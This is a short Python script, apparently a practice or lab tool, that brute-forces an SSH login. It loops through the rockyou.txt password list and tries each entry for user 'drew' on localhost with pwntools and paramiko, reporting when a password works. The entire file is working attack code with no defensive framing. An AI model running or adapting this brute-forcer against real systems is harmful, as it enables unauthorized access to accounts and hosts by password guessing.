from pwn import * 
import paramiko

host = "127.0.0.1"
username = "drew"
attempts = 0

with open("rockyou.txt" , "r") as password_lists:
    for password in password_lists:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts,password))
            response = ssh(host=host,user=username, password=password,timeout=1)
            if response.connected():
                print("[>] Valid Password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1